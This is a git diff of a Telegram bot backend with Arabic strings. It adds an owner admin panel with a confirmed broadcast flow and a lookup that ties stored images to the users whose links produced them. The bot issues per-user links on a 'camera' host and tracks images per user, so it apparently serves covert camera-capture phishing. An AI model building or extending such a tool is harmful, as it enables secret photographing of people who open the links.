@@ -5,6 +5,10 @@ const SB_URL = process.env.SUPABASE_URL;
 const SB_KEY = process.env.SUPABASE_SERVICE_KEY;
 const OWNER_TG = 'Saleck_bz';
 
+// ذاكرة مؤقتة
+const broadcastMode = {};
+const broadcastPending = {};
+
 async function sb(path, method, body) {
   const r = await fetch(SB_URL + '/rest/v1/' + path, {
     method: method || 'GET',
@@ -33,7 +37,6 @@ export default async function handler(req, res) {
   const cbq = update && update.callback_query;
   const msg = update && update.message;
 
-  // ============ دوال مساعدة ============
   async function api(method, data) {
     return await fetch('https://api.telegram.org/bot' + TG_TOKEN + '/' + method, {
       method: 'POST',
@@ -58,10 +61,6 @@ export default async function handler(req, res) {
     await api('answerCallbackQuery', { callback_query_id: id, text: text || '' });
   }
 
-  async function sendPhoto(chat, url, cap) {
-    await api('sendPhoto', { chat_id: chat, photo: url, caption: cap || '' });
-  }
-
   const MENU = {
     inline_keyboard: [
       [{ text: '📊 إحصائيات', callback_data: 'stats' }, { text: '👥 المستخدمون', callback_data: 'users_0' }],
@@ -71,7 +70,7 @@ export default async function handler(req, res) {
     ]
   };
 
-  // ============ معالجة الأزرار ============
+  // ============ الأزرار ============
   if (cbq) {
     const data = cbq.data || '';
     const chatId = cbq.message.chat.id;
@@ -85,7 +84,6 @@ export default async function handler(req, res) {
 
     await answerCB(cbq.id, '✓');
 
-    // القائمة
     if (data === 'menu') {
       await editMsg(chatId, msgId, '🎛️ <b>لوحة التحكم</b>\n\nاختر:', MENU);
     }
@@ -95,7 +93,6 @@ export default async function handler(req, res) {
       const users = await sb('users?select=chat_id') || [];
       const images = await sb('images?select=id') || [];
       const blocked = await sb('users?blocked=eq.true&select=chat_id') || [];
-
       const today = new Date(); today.setHours(0,0,0,0);
       const todayImages = await sb('images?select=id&created_at=gte.' + today.toISOString()) || [];
 
@@ -121,8 +118,6 @@ export default async function handler(req, res) {
       } else {
         const u = users[Math.abs(idx) % users.length];
         const st = u.blocked ? '🚫 محظور' : '✅ نشط';
-
-        // عدد صور هذا المستخدم
         const imgs = await sb('images?chat_id=eq.' + u.chat_id + '&select=id') || [];
 
         const txt =
@@ -206,7 +201,7 @@ export default async function handler(req, res) {
           '📅 ' + new Date(im.created_at).toLocaleString('ar');
 
         const btns = [];
-        btns.push([{ text: '👤 صاحبها', callback_data: 'users_0' }]);
+        btns.push([{ text: '👤 صاحبها', callback_data: 'finduser_' + im.chat_id }]);
         btns.push([
           { text: '⬅️', callback_data: 'gallery_' + (Math.abs(idx) - 1 < 0 ? imgs.length-1 : Math.abs(idx)-1) },
           { text: '➡️', callback_data: 'gallery_' + ((Math.abs(idx)+1) % imgs.length) }
@@ -217,18 +212,77 @@ export default async function handler(req, res) {
       }
     }
 
-    // مساعدة البث
+    // البحث عن صاحب صورة
+    if (data.startsWith('finduser_')) {
+      const id = data.substring(9);
+      const u = await sb('users?chat_id=eq.' + id);
+      if (!u || !u.length) {
+        await editMsg(chatId, msgId, '❌ المستخدم غير موجود في القاعدة.', {
+          inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]]
+        });
+      } else {
+        const usr = u[0];
+        const imgs = await sb('images?chat_id=eq.' + id + '&select=id') || [];
+        await editMsg(chatId, msgId,
+          '👤 <b>' + (usr.name || '—') + '</b>\n' +
+          '📱 ' + (usr.username || '—') + '\n' +
+          '🆔 <code>' + usr.chat_id + '</code>\n' +
+          '📸 صور: ' + imgs.length + '\n' +
+          'الحالة: ' + (usr.blocked ? '🚫' : '✅'),
+          { inline_keyboard: [
+            [{ text: usr.blocked ? '✅ إلغاء الحظر' : '🚫 حظر',
+              callback_data: (usr.blocked ? 'ub_' : 'b_') + usr.chat_id }],
+            [{ text: '💬 حسابه', url: 'tg://user?id=' + usr.chat_id }],
+            [{ text: '🔙 رجوع', callback_data: 'menu' }]
+          ]}
+        );
+      }
+    }
+
+    // بث رسالة
     if (data === 'broadcast_help') {
+      broadcastMode[chatId] = true;
       await editMsg(chatId, msgId,
-        '📢 <b>البث</b>\n\nأرسل:\n<code>/broadcast رسالتك هنا</code>\n\nستصل لكل المستخدمين.',
-        { inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]] }
+        '📢 <b>بث رسالة</b>\n\n' +
+        '✍️ أرسل الآن الرسالة التي تريد بثها للجميع.',
+        { inline_keyboard: [[{ text: '❌ إلغاء', callback_data: 'broadcast_cancel' }]] }
       );
     }
 
-    // مساعدة البحث
+    if (data === 'broadcast_cancel') {
+      delete broadcastMode[chatId];
+      delete broadcastPending[chatId];
+      await editMsg(chatId, msgId, '❌ تم الإلغاء.', {
+        inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]]
+      });
+    }
+
+    if (data === 'broadcast_confirm') {
+      const pendingMsg = broadcastPending[chatId];
+      if (!pendingMsg) {
+        await editMsg(chatId, msgId, '❌ لا توجد رسالة.', {
+          inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]]
+        });
+      } else {
+        const users = await sb('users?select=chat_id') || [];
+        let sent = 0;
+        for (const u of users) {
+          try {
+            await send(u.chat_id, '📢 <b>رسالة من المبرمج</b>\n\n' + pendingMsg);
+            sent++;
+          } catch (e) {}
+        }
+        delete broadcastMode[chatId];
+        delete broadcastPending[chatId];
+        await editMsg(chatId, msgId, '✅ تم الإرسال إلى <b>' + sent + '</b> مستخدم.', {
+          inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]]
+        });
+      }
+    }
+
     if (data === 'search_help') {
       await editMsg(chatId, msgId,
-        '🔍 <b>بحث</b>\n\nأرسل:\n<code>/find 123456789</code>\n\nسترى تفاصيل المستخدم.',
+        '🔍 <b>بحث</b>\n\nأرسل:\n<code>/find 123456789</code>',
         { inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]] }
       );
     }
@@ -245,6 +299,21 @@ export default async function handler(req, res) {
   const name = (msg.from && (msg.from.first_name || msg.from.username)) || 'صديق';
   const username = (msg.from && msg.from.username) ? '@' + msg.from.username : '';
   const isOwner = String(chatId) === String(OWNER_CHAT);
+
+  // ============ وضع البث ============
+  if (isOwner && broadcastMode[chatId]) {
+    broadcastPending[chatId] = text;
+    delete broadcastMode[chatId];
+    await send(chatId,
+      '📢 <b>معاينة الرسالة</b>:\n\n' + text + '\n\nهل تريد إرسالها للجميع؟',
+      { inline_keyboard: [
+        [{ text: '✅ إرسال للجميع', callback_data: 'broadcast_confirm' }],
+        [{ text: '❌ إلغاء', callback_data: 'broadcast_cancel' }]
+      ]}
+    );
+    res.status(200).send('OK');
+    return;
+  }
 
   // ============ أوامر المالك ============
   if (isOwner) {
@@ -264,7 +333,6 @@ export default async function handler(req, res) {
         const imgs = await sb('images?chat_id=eq.' + id + '&select=id') || [];
         await send(chatId,
           '👤 <b>' + (usr.name || '—') + '</b>\n' +
-          '📱 ' + (usr.username || '—') + '\n' +
           '🆔 <code>' + usr.chat_id + '</code>\n' +
           '📸 صور: ' + imgs.length + '\n' +
           'الحالة: ' + (usr.blocked ? '🚫' : '✅'),
@@ -281,17 +349,14 @@ export default async function handler(req, res) {
     if (text.startsWith('/broadcast ')) {
       const message = text.substring(11).trim();
       if (!message) { await send(chatId, '❌ اكتب رسالة'); res.status(200).send('OK'); return; }
-
       const users = await sb('users?select=chat_id') || [];
       let sent = 0;
-
       for (const u of users) {
         try {
           await send(u.chat_id, '📢 <b>رسالة من المبرمج</b>\n\n' + message);
           sent++;
         } catch (e) {}
       }
-
       await send(chatId, '✅ تم الإرسال إلى <b>' + sent + '</b> مستخدم');
       res.status(200).send('OK');
       return;
@@ -309,7 +374,6 @@ export default async function handler(req, res) {
   // ============ /start للزوار ============
   if (text === '/start' || text === '/help') {
     const link = 'https://camera-one-henna.vercel.app/t/' + chatId;
-
     const existing = await sb('users?chat_id=eq.' + chatId);
     if (!existing || existing.length === 0) {
       await sb('users', 'POST', { chat_id: chatId, name: name, username: username, link: link });
@@ -359,4 +423,4 @@ export default async function handler(req, res) {
     { inline_keyboard: [[{ text: '📋 نسخ', url: link2 }]] });
 
   res.status(200).send('OK');
-       }
+            }
